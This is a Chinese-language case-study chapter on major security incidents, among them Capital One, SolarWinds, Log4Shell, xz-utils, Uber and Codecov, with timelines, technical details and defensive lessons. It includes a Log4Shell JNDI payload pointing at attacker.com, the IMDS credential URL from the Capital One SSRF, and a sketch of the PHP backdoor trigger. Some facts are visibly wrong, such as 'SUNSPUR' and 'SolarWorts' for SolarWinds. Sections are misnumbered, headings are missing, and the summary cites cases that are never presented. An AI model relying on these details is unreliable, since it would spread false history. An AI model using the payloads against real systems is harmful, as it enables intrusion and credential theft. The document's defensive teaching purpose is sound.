## 二 案例详解

### 2.1 Capital One（2019）🔥

**时间线**：

```
2019-03-12: 攻击者 Paige Thompson（前 AWS 员工）扫描 AWS WAF 配置
2019-03-22: SSRF 漏洞 - 通过 WAF metadata endpoint 访问 IMDSv1
2019-03-22: 获取 EC2 IAM Role 凭证
2019-03-22: 凭证外泄到攻击者服务器（境外 IP）
2019-03-22 ~ 2019-07: 用凭证 ListBuckets、GetObject，下载 1 亿条数据
2019-07-17: 攻击者邮件暴露，Capital One 收到提示
2019-07-19: 确认泄露
2019-08-23: 攻击者被捕
2022-05: 罚款 1.9 亿美元
```

**技术细节**：

1. **SSRF**：WAF 配置不当，允许通过 `http://169.254.169.254/latest/meta-data/iam/security-credentials/` 访问 IMDSv1。
2. **凭证外泄**：EC2 IAM Role 凭证（含 `kms:Decrypt` 权限）。
3. **数据下载**：攻击者用凭证调用 S3 ListBuckets、GetObject，下载 1 亿条信用卡申请数据。
4. **KMS Decrypt 9 次**：日志显示攻击者尝试用 KMS 解密数据，因 Key Policy 限制未成功（部分）。

**关键启示**：
- **IMDSv2 强制**：IMDSv1 易 SSRF，IMDSv2 需 PUT + Token，防 SSRF。
- **GuardDuty 开启**：`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` finding 可立即告警（Capital One 当时未开）。
- **KMS Key Policy 限 EncryptionContext**：即使凭证外泄，限制了 KMS Decrypt 范围。
- **网络出站限制**：EC2 不应能访问境外 IP，可用 VPC egress filtering。
- **CloudTrail 数据事件**：S3 GetObject 全审计，事后追溯必备。

**对应章节**：[§2 IAM](./02-身份与访问管理.md)、[§3 网络](./03-网络安全.md)、[§11 KMS](./11-密钥与机密管理.md)、[§13 威胁检测](./13-威胁检测与响应.md)。

### 2.2 SolarWinds（2020）🔥

**时间线**：

```
2019-09: 攻击者入侵 SolarWinds 构建系统
2020-03-26: SUNSPUR 后门通过 Orion 5.6.5 更新植入
2020-03 ~ 2020-12: 18000 客户安装被污染的更新
2020-12-13: FireEye 公开披露
2020-12-14: CISA 发布紧急指令 AA21-077A
2021-01: 多家美国政府机构受影响（财政部、国务院、国防部）
2021-04: 美国制裁俄罗斯
```

**技术细节**：

1. **构建系统入侵**：攻击者通过 SolarWinds 内部网络入侵构建服务器。
2. **代码植入**：在 Orion 软件更新包中植入 SUNSPUR 后门（DLL side-loading）。
3. **签名合法**：更新包用 SolarWorts 有效证书签名，客户验证通过。
4. **后门激活**：SUNSPUR 通过 DGA 域名（avsvmcloud.com）C2 通信。
5. **横向移动**：在客户网络中横向到 Azure AD、O365、邮件系统。
6. **隐蔽性**：后门等待 1-2 周激活，避免立即触发检测。

**关键启示**：
- **构建管道高权限**：CI 凭证可访问生产，被攻破即失守。
- **签名验证不足**：客户验证签名通过，但签名是 SolarWorts 自己签的——签名不等于安全。
- **透明日志缺失**：没有 Rekor 这样的透明日志，签名被篡改不可发现。
- **SLSA L3 需要**：托管构建平台 + 隔离 + Provenance。
- **零信任架构**：内部网络不应默认信任。
- **多因素 MFA + Conditional Access**：Azure AD 横向需 MFA + 设备合规检查。

**对应章节**：[§10 DevSecOps](./10-DevSecOps.md)、[§16 供应链安全](./16-供应链安全.md)、[§6 零信任](./06-零信任架构.md)。

### 2.3 Tesla K8s（2018）🔥

**时间线**：

```
2018-02-20: 红队研究人员发现 Tesla K8s console 公开访问（无认证）
2018-02: 攻击者已先于红队入侵，部署挖矿
2018-02-22: Tesla 收到报告，立即修复
2018-03-01: 公开披露
```

**技术细节**：

1. **K8s Console 公开**：Tesla K8s dashboard（Kubernetes Dashboard）暴露公网，无认证。
2. **拿到凭证**：通过 console 访问 AWS IAM 凭证（存在 Pod 环境变量）。
3. **挖矿**：部署 Monero 挖矿 Pod，使用 Tesla 资源。
4. **隐蔽**：用 CloudFlare 隐藏 C2 流量，挖矿池用 stratum+tcp。

**关键启示**：
- **K8s Dashboard 不公开**：内部服务不暴露公网，用 VPN 或 Zero Trust。
- **RBAC 严格**：Dashboard 用最小权限 SA，不用 cluster-admin。
- **凭证不入 Pod ENV**：用 IRSA / Workload Identity。
- **网络出站限制**：Pod egress 白名单，禁挖矿池域名。
- **Falco / Tetragon**：检测容器内挖矿进程。

**对应章节**：[§5 工作负载安全](./05-工作负载安全.md)、[§17 Serverless](./17-serverless安全.md)。

### 2.4 Uber（2022）🔥

**时间线**：

```
2022-09-15: 攻击者获得 Uber 工程师 VPN 凭证（疑似社工）
2022-09-15: MFA 疲劳攻击（连续推送 MFA 直到用户批准）
2022-09-15: 攻击者访问内部系统（SSO、Slack、HackMD）
2022-09-15: 找到 PowerShell 脚本，含 Thycotic（PAM）管理员凭证
2022-09-15: 通过 Thycotic 拿到 AWS、GCP、DUO 等凭证
2022-09-15: 访问 Vault、GCP production、AWS production
2022-09-15: 在 Slack 全员频道发消息 "I announce I am a hacker and I have leaked your data"
2022-09-15: Uber 通知执法
2022-09-16: Uber 公开披露
2023-07: 罚款 2.9 亿美元
```

**技术细节**：

1. **MFA 疲劳**：攻击者持续推送 MFA 请求（每分钟多次），用户嫌烦批准。
2. **SSO 横向**：拿到 SSO 后访问 Slack、Jira、HackMD 等内部工具。
3. **凭证存储在脚本**：PowerShell 脚本含明文 Thycotic 管理员凭证。
4. **PAM 被攻破**：Thycotic 控制所有特权账号，被攻破即失守。
5. **Vault / GCP / AWS production**：所有云生产环境失守。

**关键启示**：
- **抗疲劳 MFA**：MFA 推送需限频（5 分钟最多 3 次）；数字匹配（"请在 App 中输入显示的两位数字"）；位置感知。
- **凭证不入脚本**：用 Secrets Manager / Vault；脚本用 STS 短期凭证。
- **PAM 加固**：Thycotic / CyberArk 单独隔离，多重 MFA。
- **零信任**：内部网络不默认信任，每个访问需验证。
- **Canary Token**：散布假凭证，被使用即告警。
- **SOC 监控**：异常 SSO 登录（地理、设备、时间）实时告警。

**对应章节**：[§2 IAM](./02-身份与访问管理.md)、[§6 零信任](./06-零信任架构.md)、[§11 KMS](./11-密钥与机密管理.md)。

### 2.5 Codecov（2021）🔥

**时间线**：

```
2021-01-31: 攻击者修改 Codecov bash uploader 脚本（bash-uploader.sh）
2021-01 ~ 2021-04: 2 个月未发现
2021-04-01: Codecov 工程师发现脚本 hash 不匹配
2021-04-01: 公开披露
2021-04 ~ 2021-12: 多家客户凭证泄露（HashiCorp、Twilio、Rapid7 等）
```

**技术细节**：

1. **bash uploader 篡改**：Codecov bash uploader 用于 CI 上传代码覆盖率，被植入后门。
2. **后门行为**：扫描 CI 环境变量，找到 token 后外泄到 codecov.io 的子域（攻击者控制）。
3. **2 个月未发现**：脚本 hash 未校验，客户信任 Codecov。
4. **影响范围**：Codecov 客户数千家，含 HashiCorp、Twilio、Rapid7 等，部分客户 AWS / GCP 凭证泄露。

**关键启示**：
- **第三方脚本要校验签名 + hash**：`curl | bash` 是反模式。
- **CI 凭证短期化**：用 OIDC + 短期 STS，不用长期 AK/SK。
- **CI 出站监控**：异常出站（向未知域名）告警。
- **供应链完整性**：即使是测试工具也要 SBOM + 签名验证。
- **环境变量最小化**：CI 仅暴露必要 token，不暴露云账号凭证。

**对应章节**：[§10 DevSecOps](./10-DevSecOps.md)、[§11 KMS](./11-密钥与机密管理.md)、[§16 供应链](./16-供应链安全.md)。

### 2.6 xz-utils（2024）🔥

**时间线**：

```
2021: 攻击者 "Jia Tan" 加入 xz-utils 项目（早期贡献者）
2022-2023: Jia Tan 持续贡献，逐步获得 maintainer 权限
2024-02: Jia Tan 在 xz 5.6.0/5.6.1 引入后门（通过 m4/build-to-host.m4）
2024-02-23: Debian/Ubuntu 不稳定版开始打包 5.6.1
2024-03-29: Microsoft 工程师 Andres Freund 发现 SSH 性能下降 500ms，调查后公开
2024-03-29: CVE-2024-3094 公布，CVSS 10.0
2024-04: 攻击者身份调查（疑似 Jia Tan 是化名）
```

**技术细节**：

1. **长期渗透**：攻击者 3 年时间从贡献者到 maintainer，逐步获得信任。
2. **构建脚本注入**：在 m4/build-to-host.m4 中嵌入恶意代码（构建时执行）。
3. **隐藏后门**：在 liblzma 中嵌入恶意 IFUNC 解析器，hook 到 sshd 的 `RSA_public_decrypt`。
4. **触发条件**：特定 payload（Ed448 签名）触发 RCE。
5. **被发现**：Andres Freund 调试 SSH 性能问题（500ms 启动延迟）发现。

**关键启示**：
- **单一维护者项目高风险**：维护者可被收买或胁迫。
- **构建脚本审计**：m4 / Makefile / CMake 都可能被植入后门。
- **性能变化可能指示后门**：Freund 因性能发现是运气，更多后门未被发现的可能。
- **可复现构建重要**：SLSA L4 要求可复现构建，可验证未被篡改。
- **开源供应链安全**：开源项目需 OpenSSF Scorecard 评估。
- **关键基础设施依赖审计**：sshd 依赖 liblzma 这种小项目，应审计。

**对应章节**：[§10 DevSecOps](./10-DevSecOps.md)、[§16 供应链](./16-供应链安全.md)。

### 2.7 Log4Shell（2021）🔥

**时间线**：

```
2021-11-24: 阿里云安全团队陈兆军发现 Log4j JNDI 漏洞
2021-12-09: Apache 公布 CVE-2021-44228（Log4Shell），CVSS 10.0
2021-12-09 ~ 2022: 全球紧急响应，数万应用受影响
2021-12-14: 多个勒索软件利用 Log4Shell 传播
2022-01: 各大厂补丁完成
2022 至今: 长尾漏洞，仍有未补丁系统
```

**技术细节**：

1. **JNDI 注入**：Log4j 2.x 解析日志消息时，遇到 `${jndi:ldap://attacker.com/exploit}` 会执行 JNDI 查找。
2. **RCE**：JNDI 加载远程类，攻击者可 RCE。
3. **影响范围**：所有用 Log4j 2.x 的 Java 应用（数万）。
4. **变种**：`${jndi:rmi://}`、`${jndi:dns://}`、嵌套 `${${...}}}` 绕过过滤。
5. **难以根治**：传递依赖深，应用层修补可能漏。

**关键启示**：
- **SBOM 关键**：有 SBOM 可快速定位使用 Log4j 的应用。
- **依赖漏洞响应流程**：CVE 公布后 24 小时内识别影响、72 小时内修补。
- **WAF 临时缓解**：拦截 `${jndi:` payload，但需注意绕过变种。
- **传递依赖管理**：Maven/Gradle 深度依赖需工具分析。
- **不可变基础设施**：容器镜像替换而非热补丁，更彻底。
- **红蓝对抗**：模拟 Log4Shell 攻击测试响应。

**对应章节**：[§10 DevSecOps](./10-DevSecOps.md)、[§16 供应链](./16-供应链安全.md)、[§13 威胁检测](./13-威胁检测与响应.md)。

### 2.8 Colonial Pipeline（2021）🔥

**时间线**：

```
2021-05-07: 攻击者用泄露的 VPN 密码登录 Colonial Pipeline 网络
2021-05-07: 部署 DarkSide 勒索软件
2021-05-07: Colonial Pipeline 关闭 5500 英里管道
2021-05-09: 美国东海岸燃油短缺，宣布紧急状态
2021-05-13: Colonial 付赎金 75 比特币（约 440 万美元）
2021-06-07: 美国司法部追回部分赎金（63.7 比特币）
2021-06-15: DarkSide 解散
```

**技术细节**：

1. **VPN 凭证泄露**：暗网泄露的 VPN 密码，未启用 MFA。
2. **横向移动**：从 IT 网络横向到 OT 网络（管道控制系统）。
3. **勒索软件部署**：DarkSide 加密文件系统。
4. **业务停摆**：Colonial 主动关闭管道，防 OT 系统被感染。

**关键启示**：
- **VPN 强制 MFA**：所有远程访问必须 MFA。
- **IT/OT 隔离**：业务网络与控制系统严格隔离（air gap 或单向网关）。
- **不可变备份**：Colonial 有备份但仍付赎金（恢复太慢），不可变 + 快速恢复更重要。
- **不要付赎金**：Colonial 付了 440 万，但仅追回部分；CISA 强烈不建议付赎金。
- **CISA 指南**：StopRansomware.gov 提供防御指南。
- **关键基础设施监管**： TSA 后续强制管道公司实施网络安全要求。

**对应章节**：[§2 IAM](./02-身份与访问管理.md)、[§13 IR](./13-威胁检测与响应.md)、[§19 DR](./19-灾难恢复与业务连续性.md)。

### 2.9 OVH（2021）🔥

**时间线**：

```
2021-03-10: 法国 OVH Strasbourg 数据中心 SBG2 起火
2021-03-10: SBG1/2/3/4 全部断电
2021-03-15: 火势控制
2021-03-15: 客户数据永久丢失（部分无备份）
2021-04: 多家初创公司倒闭
```

**技术细节**：

1. **火灾**：SBG2 起火原因不明，怀疑电气故障。
2. **服务中断**：SBG1/2/3/4 全部断电，数千客户受影响。
3. **数据丢失**：部分客户无跨区备份，数据永久丢失。
4. **政府反应**：法国政府要求云厂商提供灾备方案。

**关键启示**：
- **跨区 DR 必备**：单数据中心故障不可恢复，跨区复制必须。
- **多云策略**：避免单一云厂商，多云部署降风险。
- **3-2-1 备份规则**：3 份、2 媒介、1 异地。
- **物理安全审计**：数据中心消防、电气审计。
- **业务影响评估**：DR 演练需包括"全数据中心丢失"场景。

**对应章节**：[§19 DR](./19-灾难恢复与业务连续性.md)、[§15 多云](./15-多云与混合云安全.md)。

```
2017-01-31: GitLab 工程师疲劳，在生产数据库执行 rm -rf
2017-01-31: 删除主数据库
2017-01-31: 发现后尝试恢复，但 5 个备份均失效
2017-01-31: LVM snapshot 拯救（6 小时前数据）
2017-02-01: 公开披露
2017-02-10: 业务恢复
```

**技术细节**：

1. **疲劳操作**：工程师处理故障，错在 production 上执行 rm -rf。
2. **删除主库**：删除 db/data 目录（PostgreSQL 数据）。
3. **5 个备份失效**：
   - **定期备份**：未成功执行（剧本错误）
   - **磁盘备份**：磁盘满，未生成
   - **AWS S3 备份**：未配置
   - **Staging 复制**：未运行
   - **LVM snapshot**：6 小时前的，唯一可用
4. **数据丢失**：6 小时生产数据（含 issue、PR、用户）丢失。

**关键启示**：
- **备份验证必须**：每周 / 月实际恢复测试，发现失效备份。
- **多源备份**：S3 + 磁盘 + 异地 + snapshot，至少 3 个独立来源。
- **生产 rm -rf 防护**：rm 命令用 trash-cli 替代；生产操作需双人审批。
- **疲劳管理**：工程师疲劳是事故主因，强制休息。
- **Postmortem 公开**：GitLab 公开复盘，行业学习。

**对应章节**：[§19 DR](./19-灾难恢复与业务连续性.md)、[§13 IR](./13-威胁检测与响应.md)。

### 2.13 Docker Hub（2019）🔥

**时间线**：

```
2019-04-25: Docker Hub 遭到未授权访问
2019-04-25: 19 万用户 token 泄露
2019-05-24: Docker 强制重置所有 token
2019-05-24: 受影响用户通知
```

**技术细节**：

1. **Docker Hub 数据库未授权访问**：攻击者获得只读访问。
2. **泄露内容**：用户名、 hashed 密码（bcrypt）、GitHub / Bitbucket token（用于自动构建）。
3. **影响**：19 万用户 token 泄露，部分用户源码仓库被访问。

**关键启示**：
- **OAuth scope 最小化**：GitHub token 仅需 read，不要 write。
- **客户端凭证集中管理**：Docker Hub 替代方案：GitHub Container Registry + OIDC。
- **token 轮转**：定期轮转，泄露即重置。
- **数据库加密 + 访问审计**：敏感数据加密存储。

**对应章节**：[§11 KMS](./11-密钥与机密管理.md)、[§5 工作负载安全](./05-工作负载安全.md)。

### 2.14 Morgan Stanley（2022）🔥

**时间线**：

```
2016-2022: Morgan Stanley 第三方供应商多次泄露客户数据
2022-07: Morgan Stanley 通知 1500 万客户数据泄露
2022-07: 调查发现供应商退役服务器未正确擦除
```

**技术细节**：

1. **第三方供应商**：Morgan Stanley 把退役设备交由供应商处理。
2. **数据未擦除**：供应商未正确擦除硬盘，含客户 PII。
3. **设备转售**：硬盘被转售，买家发现数据后报告。
4. **影响范围**：1500 万客户数据泄露。

**关键启示**：
- **TPRM 流程**：第三方供应商严格审查 + 合同条款。
- **数据擦除验证**：退役设备擦除后第三方验证（NIST 800-88）。
- **加密粉碎**：数据加密 + 删除 KMS Key，比擦除更可靠。
- **供应链监控**：BitSight / SecurityScorecard 持续评估供应商。
- **合同条款**：违约责任、审计权、退出机制。

### 2.15 LastPass（2022）🔥

**时间线**：

```
2022-08-12: 攻击者用 DevOps 工程师凭证访问 LastPass 开发环境
2022-08: 窃取源代码 + 部分客户数据
2022-11-30: 攻击者用之前窃取的信息访问生产环境
2022-12: 窃取客户密码库（加密）
2022-12-22: LastPass 公开披露
2023 至今: 部分用户报告被攻击（推测主密码被暴力破解）
```

**技术细节**：

1. **DevOps 凭证失窃**：攻击者通过社工 / 钓鱼拿到 DevOps 工程师凭证。
2. **开发环境访问**：窃取源代码 + 技术文档。
3. **横向到生产**：用开发环境信息横向到生产环境。
4. **密码库窃取**：客户密码库（加密）被窃，主密码未泄露（LastPass 不存）。

- **DevOps 凭证监控**：开发环境凭证是高价值目标，需重点监控。
- **零信任架构**：开发环境与生产严格隔离。
- **加密设计**：LastPass 加密设计正确（主密码不存），但实现可能有缺陷。
- **信息披露及时**：LastPass 4 个月才完整披露，被监管罚款。
- **用户教育**：用户用强主密码 + 2FA，降低风险。

### 2.18 PHP Git（2021）🔥

**时间线**：

```
2021-03-28: 攻击者入侵 git.php.net 服务器
2021-03-28: 在 PHP 源码 master 分支植入后门
2021-03-28: 后门允许 RCE（特定 User-Agent 触发）
2021-03-29: PHP 维护者发现并回滚
2021-03-29: PHP 迁移到 GitHub
```

**技术细节**：

1. **git 服务器入侵**：攻击者获得 git.php.net 服务器访问权限。
2. **直接 push master**：绕过 code review，直接 push 后门到 master。
3. **后门代码**：

```c
if (zend_parse_parameters(...) == FAILURE) {
    // ...
}
if (strstr(Z_STRVAL_P(arg1), "zerodium")) {  // 触发字符串
    // 执行用户输入的 PHP 代码
}
```

4. **触发**：通过 User-Agent 头含 "zerodium" 触发 RCE。

**关键启示**：
- **仓库入侵检测**：异常 push 告警（绕过 PR）。
- **签名 commit**：GPG 签名验证。
- **分支保护**：master 强制 PR + 2 审，禁止直接 push。
- **迁移 GitHub**：利用 GitHub 的安全机制（branch protection、2FA）。
- **关键基础设施审计**：PHP 是 Web 基础设施，仓库被入侵影响巨大。

**对应章节**：[§10 DevSecOps](./10-DevSecOps.md)、[§16 供应链](./16-供应链安全.md)。

## 三 案例规律总结

### 3.1 攻击模式分布

```
身份与访问类（30%）：
  - 凭证泄露（Capital One、Codecov、Docker Hub、LastPass）
  - MFA 疲劳（Uber）
  - 内部威胁（Twitter）

供应链类（25%）：
  - 构建系统入侵（SolarWinds、xz-utils）
  - 维护者被钓鱼（npm ua-parser-js）
  - 第三方脚本（Codecov）
  - 依赖漏洞（Log4Shell）

配置缺陷类（20%）：
  - 数据库公开（DeepSeek）
  - K8s Console 公开（Tesla）
  - S3 桶公开

灾难/勒索类（15%）：
  - 勒索软件（Colonial Pipeline、Maersk）
  - 数据中心火灾（OVH）
  - 备份失效（GitLab、Code Spaces）

合规类（10%）：
  - 数据出境（滴滴）
  - 第三方管理（Morgan Stanley）
```

### 3.2 共同根因

1. **凭证管理失败**：长期凭证、明文存储、未轮转。
2. **MFA 不强制或可绕过**：MFA 疲劳、IMDSv1 SSRF。
3. **配置漂移**：内部服务公开、备份失效未发现。
4. **供应链信任过度**：第三方脚本不验证、开源维护者不被审。
5. **DR 演练不足**：备份失效未发现、跨区 DR 未部署。
6. **监控告警缺失**：GuardDuty 未开、异常出站未告警。

### 3.3 防御共性

1. **零信任**：身份 + 设备 + 上下文验证。
2. **最小权限**：IAM 资源级 + 条件键。
3. **不可变备份**：WORM + 跨账号 + Air Gap。
4. **持续监控**：GuardDuty + CloudTrail + SIEM。
5. **演练常态化**：DR + IR + Red Team。
6. **供应链加固**：签名 + SBOM + Provenance。

## 六 案例研究方法

### 6.1 案例分析框架

```
1. 时间线（Timeline）
   - 攻击发生时间
   - 检测时间
   - 响应时间
   - 公开时间

2. 攻击路径（Kill Chain）
   - 初始访问（Initial Access）
   - 持久化（Persistence）
   - 横向移动（Lateral Movement）
   - 影响（Impact）

3. 根因分析（Root Cause）
   - 直接原因
   - 间接原因
   - 系统性原因

4. 影响评估（Impact）
   - 业务影响
   - 数据影响
   - 财务影响
   - 声誉影响

5. 改进措施（Remediation）
   - 短期：止血
   - 中期：加固
   - 长期：架构改进

6. 行业启示（Industry Lessons）
   - 通用防御建议
   - 检测规则
   - 演练场景
```
